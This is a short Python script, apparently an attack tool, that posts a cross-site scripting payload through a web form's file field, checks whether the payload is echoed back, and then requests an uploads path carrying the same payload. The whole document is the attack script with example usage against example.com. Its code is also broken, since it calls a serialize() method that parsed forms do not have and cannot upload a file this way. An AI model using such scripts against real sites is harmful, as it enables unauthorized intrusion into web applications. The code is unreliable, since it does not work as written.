import requests
from bs4 import BeautifulSoup

def inject_script(url, script):
    # Send a GET request to the URL and parse the HTML
    response = requests.get(url)
    soup = BeautifulSoup(response.content, "html.parser")

    # Find the form in the parsed HTML
    form = soup.find("form")

    # Find the file input field and set its value to the injected script
    file_field = form.find("input", {"type": "file"})
    file_field["value"] = script

    # Find the submit button in the form
    submit_button = form.find("input", {"type": "submit"})

    # Serialize the form data and send a POST request
    response = requests.post(url, data=form.serialize())

    # Check if the injected script is present in the response
    if script in response.text:
        print("Injection successful!")
    else:
        print("Injection failed!")

# Example usage
url = "http://example.com"
script_to_inject = "<script>alert('Injected!');</script>"
inject_script(url, script_to_inject)

# Additional GET request to a file URL with injected script
file_url = f"http://example.com/uploads/{script_to_inject}"
response = requests.get(file_url)
